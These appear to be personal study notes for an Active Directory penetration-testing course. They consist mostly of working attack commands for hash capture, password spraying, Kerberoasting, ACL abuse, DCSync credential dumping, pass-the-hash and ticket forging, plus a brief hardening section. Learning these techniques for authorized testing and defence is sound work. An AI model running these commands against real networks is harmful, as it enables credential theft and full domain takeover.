# 01 — Active Directory Enumeration & Attacks
> HTB Academy | AD Penetration Tester Path  
> red-book/modules/01-AD-Enum-Attacks.md

---

## Setting The Stage

**Why AD?** AD is present in the majority of corporate environments. A single misconfiguration can lead to full domain compromise from a standard user account.

**Tools of the Trade:**
| Tool | Purpose |
|------|---------|
| `BloodHound` / `SharpHound` | attack path visualization |
| `PowerView` | AD enumeration from Windows |
| `CrackMapExec` / `nxc` | SMB/LDAP/WinRM at scale |
| `Kerbrute` | user enumeration + spray over Kerberos |
| `Responder` | LLMNR/NBT-NS poisoning |
| `Impacket suite` | all-purpose AD attack toolkit |
| `enum4linux-ng` | SMB/LDAP enumeration from Linux |
| `ldapsearch` | raw LDAP queries |
| `Mimikatz` / `secretsdump` | credential extraction |

**Scenario:** assume low-priv foothold (domain user or unauthenticated on the network). Goal: escalate to Domain Admin.

---

## Initial Enumeration

### External Recon & Enumeration Principles
Before touching the network — passive recon first.
```bash
# DNS enumeration
nslookup domain.local
dig any domain.local @<DC_IP>

# Zone transfer attempt
dig axfr domain.local @<DC_IP>

# Subdomain/host discovery
gobuster dns -d domain.local -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

### Initial Enumeration of the Domain
```bash
# Host discovery
sudo arp-scan -l
sudo responder -I eth0 -A          # passive — listen only, no poison

# SMB enumeration (unauthenticated)
enum4linux-ng -A <DC_IP>
nxc smb <CIDR>                     # get hostnames, OS, signing status
nxc smb <DC_IP> -u '' -p ''        # null session test

# RPC null session
rpcclient -U "" -N <DC_IP>
  > enumdomusers
  > enumdomgroups
  > querydominfo

# LDAP anonymous
ldapsearch -H ldap://<DC_IP> -x -b "DC=domain,DC=local" -s base
```

---

## Sniffing Out a Foothold

### LLMNR/NBT-NS Poisoning
LLMNR (Link-Local Multicast Name Resolution) and NBT-NS are fallback name resolution protocols. When a host can't resolve a name via DNS, it broadcasts — we answer and capture Net-NTLMv2 hashes.

**Conditions:** must be on the same network segment (Layer 2).

### From Linux
```bash
# Poison + capture hashes
sudo responder -I eth0 -wPv

# Hashes saved to: /usr/share/responder/logs/
# Crack captured Net-NTLMv2
hashcat -m 5600 hashes.txt rockyou.txt
```

### From Windows
```powershell
# Inveigh (PowerShell equivalent of Responder)
Import-Module .\Inveigh.ps1
Invoke-Inveigh -ConsoleOutput Y -LLMNR Y -NBNS Y -mDNS Y -HTTPS Y -SAM Y

# Or C# version
.\Inveigh.exe
```

---

## Sighting In, Hunting For a User

### Password Spraying Overview
Single password → many users. Avoids lockout by staying under the threshold.  
**Rule of thumb:** spray once every 30 min, stay 1-2 attempts below lockout threshold.

### Enumerating & Retrieving Password Policies
```bash
# Linux — unauthenticated if null session works
enum4linux-ng -P <DC_IP>
nxc smb <DC_IP> -u '' -p '' --pass-pol

# Linux — authenticated
nxc smb <DC_IP> -u user -p pass --pass-pol
rpcclient -U "user%pass" <DC_IP> -c "getdompwinfo"

# Windows
net accounts /domain
(Get-ADDefaultDomainPasswordPolicy)   # if RSAT available
```

### Building a Target User List
```bash
# Kerbrute — enumerate valid users via Kerberos (no lockout)
kerbrute userenum -d domain.local --dc <DC_IP> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

# From SMB null session
enum4linux-ng -U <DC_IP>
nxc smb <DC_IP> -u '' -p '' --users

# From LDAP (if anonymous bind works)
ldapsearch -H ldap://<DC_IP> -x -b "DC=domain,DC=local" "(objectClass=user)" samaccountname

# From RPC
rpcclient -U "" -N <DC_IP> -c "enumdomusers"
```

---

## Spray Responsibly

### Internal Password Spraying — from Linux
```bash
# Kerbrute spray
kerbrute passwordspray -d domain.local --dc <DC_IP> users.txt 'Welcome1'

# NetExec
nxc smb <DC_IP> -u users.txt -p 'Welcome1' --continue-on-success
nxc smb <DC_IP> -u users.txt -p passwords.txt --no-bruteforce --continue-on-success

# rpcclient loop
for u in $(cat users.txt); do
  rpcclient -U "$u%Welcome1" -N <DC_IP> -c "getusername" 2>/dev/null | grep "Account Name"
done
```

### Internal Password Spraying — from Windows
```powershell
# DomainPasswordSpray
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password 'Welcome1' -OutFile spray_results.txt -ErrorAction SilentlyContinue
```

---

## Deeper Down the Rabbit Hole

### Enumerating Security Controls
```powershell
# Check Windows Defender status
Get-MpComputerStatus

# Check AppLocker policy
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

# Check PowerShell language mode (Constrained = AppLocker/WDAC active)
$ExecutionContext.SessionState.LanguageMode

# Check LAPS (if installed, local admin passwords managed by AD)
Get-Module -ListAvailable | Where-Object {$_.Name -like "*LAPS*"}
# If LAPS present, check who can read the ms-mcs-admpwd attribute
```

### Credentialed Enumeration — from Linux
```bash
# NetExec — full recon
nxc smb <DC_IP> -u user -p pass --users
nxc smb <DC_IP> -u user -p pass --groups
nxc smb <DC_IP> -u user -p pass --shares
nxc smb <DC_IP> -u user -p pass --loggedon-users
nxc smb <DC_IP> -u user -p pass --local-groups

# BloodHound collection
bloodhound-python -u user -p pass -d domain.local -ns <DC_IP> -c All

# Impacket
GetADUsers.py -all domain.local/user:pass
lookupsid.py domain/user:pass@<DC_IP>     # SID brute → users/groups
```

### Credentialed Enumeration — from Windows
```powershell
# PowerView
Get-DomainUser | select samaccountname, description, memberof, pwdlastset
Get-DomainGroup | select name, member
Get-DomainComputer | select dnshostname, operatingsystem
Get-NetShare -ComputerName <host>
Get-DomainGPO | select displayname, gpcfilesyspath

# ActiveDirectory module (if RSAT)
Get-ADUser -Filter * -Properties *
Get-ADGroup -Filter * | select name
Get-ADComputer -Filter * | select name, operatingsystem
```

### Living Off the Land
No tools needed — use what's already on the box.
```cmd
# Basic host info
systeminfo
set                          # environment variables → domain, DC
echo %logonserver%

# Domain info
net user /domain
net group /domain
net group "Domain Admins" /domain
nltest /dclist:domain.local
nltest /domain_trusts

# Network
ipconfig /all
arp -a
route print
netstat -ano
```
```powershell
# WMI queries
Get-WmiObject -Class Win32_ComputerSystem
Get-WmiObject -Class Win32_UserAccount
Get-WmiObject -Namespace root\directory\ldap -Class ds_user | select ds_samaccountname
```

---

## Cooking with Fire

### Kerberoasting — from Linux
```bash
# Get all TGS tickets for SPN accounts
GetUserSPNs.py domain.local/user:pass -outputfile tgs.txt
GetUserSPNs.py domain.local/user:pass -request-user sqlsvc   # single target

# Crack
hashcat -m 13100 tgs.txt rockyou.txt --force
```

### Kerberoasting — from Windows
```powershell
# PowerView — find targets
Get-DomainUser -SPN | select samaccountname, serviceprincipalname

# Rubeus
Rubeus.exe kerberoast /outfile:tgs.txt
Rubeus.exe kerberoast /user:sqlsvc /outfile:tgs.txt   # single target
Rubeus.exe kerberoast /tgtdeleg /outfile:tgs.txt      # with delegation — more opsec
```

---

## An ACE in the Hole

### ACL/ACE Abuse Primer
AD objects have Access Control Lists (ACLs) made of Access Control Entries (ACEs). Misconfigured ACEs allow privilege escalation without exploiting any CVE.

**High-value ACEs:**
| ACE | Abuse |
|-----|-------|
| `GenericAll` | full control over object |
| `GenericWrite` | write any attribute (e.g. set SPN → Kerberoast, set logon script) |
| `WriteOwner` | take ownership → then GenericAll |
| `WriteDACL` | add any ACE → give yourself GenericAll |
| `ForceChangePassword` | reset password without knowing current |
| `AllExtendedRights` | includes ForceChangePassword + more |
| `AddMember` | add users to a group |
| `Self` | add yourself to a group |

### ACL Enumeration
```bash
# Linux
dacledit.py -action read -target "Domain Admins" domain.local/user:pass

# Windows — PowerView
Find-InterestingDomainAcl -ResolveGUIDs | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier, IdentityReferenceName
Get-DomainObjectAcl -Identity "targetuser" -ResolveGUIDs
```

### ACL Abuse Tactics
```powershell
# GenericAll on user → force password reset
Set-DomainUserPassword -Identity victim -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)

# GenericWrite on user → set SPN → Kerberoast
Set-DomainObject -Identity victim -Set @{serviceprincipalname='fake/spn'}
Get-DomainSPNTicket -SPN "fake/spn" -OutputFormat Hashcat

# AddMember → add self to group
Add-DomainGroupMember -Identity "IT Admins" -Members attacker

# WriteDACL → give self GenericAll
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity attacker -Rights All
```

### DCSync
Requires `Replicating Directory Changes` + `Replicating Directory Changes All` on the domain object (default: DA, EA, Domain Controllers).
```bash
# Linux
secretsdump.py domain/user:pass@<DC_IP> -just-dc
secretsdump.py domain/user:pass@<DC_IP> -just-dc-user administrator

# Windows — Mimikatz
lsadump::dcsync /domain:domain.local /user:administrator
lsadump::dcsync /domain:domain.local /all /csv
```

---

## Stacking The Deck

### Privileged Access
```bash
# Pass-the-Hash
psexec.py -hashes :<NT> domain/user@<IP>
evil-winrm -i <IP> -u user -H <NT>

# Pass-the-Ticket
export KRB5CCNAME=ticket.ccache
psexec.py -k -no-pass domain.local/user@host

# Overpass-the-Hash (hash → TGT)
Rubeus.exe asktgt /user:user /rc4:<NT> /ptt
```

### Kerberos "Double Hop" Problem
When using WinRM/PSRemoting, credentials don't forward to a third host by default because only a TGT is in memory — no TGS is passed to the remote session.

**Workarounds:**
```powershell
# Option 1: PSCredential object in the remote session
$cred = Get-Credential
Invoke-Command -ComputerName target2 -Credential $cred -ScriptBlock { whoami }

# Option 2: Register-PSSessionConfiguration (if admin)
Register-PSSessionConfiguration -Name backconnect -RunAsCredential domain\user
Enter-PSSession -ComputerName host -ConfigurationName backconnect

# Option 3: Rubeus — inject TGT into remote session
Rubeus.exe asktgt /user:user /rc4:<NT> /ptt
```

### Bleeding Edge Vulnerabilities
| CVE | Name | Impact |
|-----|------|--------|
| CVE-2020-1472 | Zerologon | unauthenticated DC takeover via Netlogon |
| CVE-2021-34527 | PrintNightmare | RCE / LPE via Print Spooler |
| CVE-2021-42278/42287 | noPac | standard user → DA via sAMAccountName spoofing |
| CVE-2022-26923 | Certifried | ADCS privesc via machine account cert |
```bash
# noPac
sudo python3 noPac.py domain.local/user:pass -dc-ip <DC_IP> -shell --impersonate administrator

# Zerologon (dangerous — can break DC, use in lab only)
python3 zerologon_tester.py DCNAME <DC_IP>
```

### Miscellaneous Misconfigs
```bash
# Password in description field
nxc ldap <DC_IP> -u user -p pass --query "(&(objectClass=user)(description=*))" "samaccountname description"

# AS-REP Roasting
GetNPUsers.py domain.local/ -usersfile users.txt -format hashcat -outputfile asrep.txt
hashcat -m 18200 asrep.txt rockyou.txt

# PASSWD_NOTREQD flag
nxc ldap <DC_IP> -u user -p pass --password-not-required

# LAPS password (if readable)
nxc ldap <DC_IP> -u user -p pass -M laps
Get-DomainComputer | select dnshostname, ms-mcs-admpwd
```

---

## Why So Trusting?

### Domain Trusts Primer
- **Parent-child trust:** automatic, two-way, transitive within the same forest
- **Cross-forest trust:** manually configured, can be one or two-way
- **External trust:** non-transitive, between domains in different forests
- **Transitive:** trust flows through — if A trusts B and B trusts C, A trusts C

### Attacking Domain Trusts — Child → Parent (Windows)
```powershell
# Enumerate trusts
Get-DomainTrust
Get-ForestTrust
nltest /domain_trusts

# ExtraSIDs attack — child DA → parent EA
# Step 1: get krbtgt hash of child domain (via DCSync)
# Step 2: get child domain SID
Get-DomainSID

# Step 3: get Enterprise Admins SID (parent)
Get-DomainGroup -Domain parent.local "Enterprise Admins" | select objectsid

# Step 4: forge ticket with ExtraSID
Rubeus.exe golden /rc4:<KRBTGT_NT> /domain:child.local /sid:<CHILD_SID> /sids:<PARENT_EA_SID> /user:administrator /ptt
```

### Attacking Domain Trusts — Child → Parent (Linux)
```bash
ticketer.py -nthash <KRBTGT_NT> \
  -domain-sid <CHILD_SID> \
  -extra-sid <PARENT_EA_SID> \
  -domain child.local administrator
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass parent.local/administrator@dc.parent.local
```

---

## Breaking Down Boundaries

### Cross-Forest Trust Abuse (Windows)
```powershell
# Enum users in trusted forest
Get-DomainUser -Domain partner.local
Get-DomainForeignGroupMember -Domain partner.local    # foreign users in local groups

# If trust key available → forge inter-realm TGT
Rubeus.exe asktgt /user:administrator /domain:partner.local /rc4:<TRUST_KEY> /ptt
```

### Cross-Forest Trust Abuse (Linux)
```bash
# Get trust key (from secretsdump — look for [TRUST_DOMAIN] entries)
secretsdump.py domain/user:pass@<DC_IP>

# Forge cross-forest ticket
ticketer.py -nthash <TRUST_KEY> -domain-sid <SID> \
  -domain child.local -spn krbtgt/partner.local administrator
```

---

## Defensive Considerations

### Hardening Active Directory
| Control | Mitigation |
|---------|-----------|
| LLMNR/NBT-NS | disable via GPO |
| Password spraying | fine-grained password policies, MFA |
| Kerberoasting | use gMSA, strong passwords on SPN accounts (25+ chars) |
| DCSync | audit Replication rights on domain object |
| ACL abuse | regular ACL audits with BloodHound |
| ADCS | run Certipy/Certify periodically |
| Trusts | audit and remove unnecessary trust relationships |

### Additional AD Auditing Techniques
```powershell
# Find accounts with weak/old passwords
Search-ADAccount -PasswordNeverExpires
Search-ADAccount -PasswordExpired

# Stale computer accounts
Get-ADComputer -Filter {LastLogonDate -lt (Get-Date).AddDays(-90)}

# Privileged group membership audit
Get-ADGroupMember "Domain Admins" -Recursive
Get-ADGroupMember "Enterprise Admins" -Recursive
```

---

## Skills Assessment Checklist
- [ ] Unauthenticated enumeration (null sessions, LDAP anon, Kerbrute users)
- [ ] Capture Net-NTLMv2 via LLMNR/NBT-NS poisoning
- [ ] Password policy retrieved → spray safely
- [ ] Valid credentials obtained via spray
- [ ] BloodHound collection complete
- [ ] Kerberoastable accounts found and cracked
- [ ] ACL misconfigs identified
- [ ] DCSync executed → NTDS dumped
- [ ] Trust relationships mapped
- [ ] DA achieved in child domain
- [ ] EA achieved via ExtraSIDs (if multi-domain)

---

## Personal Notes
> *[fill during/after module]*
